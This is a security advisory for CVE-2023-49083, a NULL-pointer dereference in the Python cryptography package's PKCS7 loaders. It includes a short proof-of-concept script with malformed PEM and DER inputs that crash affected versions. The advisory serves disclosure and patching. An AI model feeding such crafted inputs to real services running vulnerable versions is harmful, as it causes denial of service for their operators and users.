# [M] cryptography vulnerable to NULL-dereference when loading PKCS7 certificates

## Summary
Severity: Medium
Advisory: GHSA-jfhm-5ghh-2f97
CVE: CVE-2023-49083
CWE: CWE-476
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2023-11-28
Source: https://github.com/advisories/GHSA-jfhm-5ghh-2f97
Type: github-advisory

## Affected
- PyPI: `cryptography` — affected >=3.1 <41.0.6

## Details
### Summary

Calling `load_pem_pkcs7_certificates` or `load_der_pkcs7_certificates` could lead to a NULL-pointer dereference and segfault.

### PoC
Here is a Python code that triggers the issue:
```python
from cryptography.hazmat.primitives.serialization.pkcs7 import load_der_pkcs7_certificates, load_pem_pkcs7_certificates

pem_p7 = b"""
-----BEGIN PKCS7-----
MAsGCSqGSIb3DQEHAg==
-----END PKCS7-----
"""

der_p7 = b"\x30\x0B\x06\x09\x2A\x86\x48\x86\xF7\x0D\x01\x07\x02"

load_pem_pkcs7_certificates(pem_p7)
load_der_pkcs7_certificates(der_p7)
```

### Impact
Exploitation of this vulnerability poses a serious risk of Denial of Service (DoS) for any application attempting to deserialize a PKCS7 blob/certificate. The consequences extend to potential disruptions in system availability and stability.

## References
- https://github.com/pyca/cryptography/security/advisories/GHSA-jfhm-5ghh-2f97
- https://nvd.nist.gov/vuln/detail/CVE-2023-49083
- https://github.com/pyca/cryptography/pull/9926
- https://github.com/pyca/cryptography/commit/f09c261ca10a31fe41b1262306db7f8f1da0e48a
- https://github.com/pyca/cryptography
- https://github.com/pypa/advisory-database/tree/main/vulns/cryptography/PYSEC-2023-254.yaml
- https://lists.debian.org/debian-lts-announce/2024/10/msg00012.html
- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QMNTYMUGFJSDBYBU22FUYBHFRZODRKXV
- http://www.openwall.com/lists/oss-security/2023/11/29/2
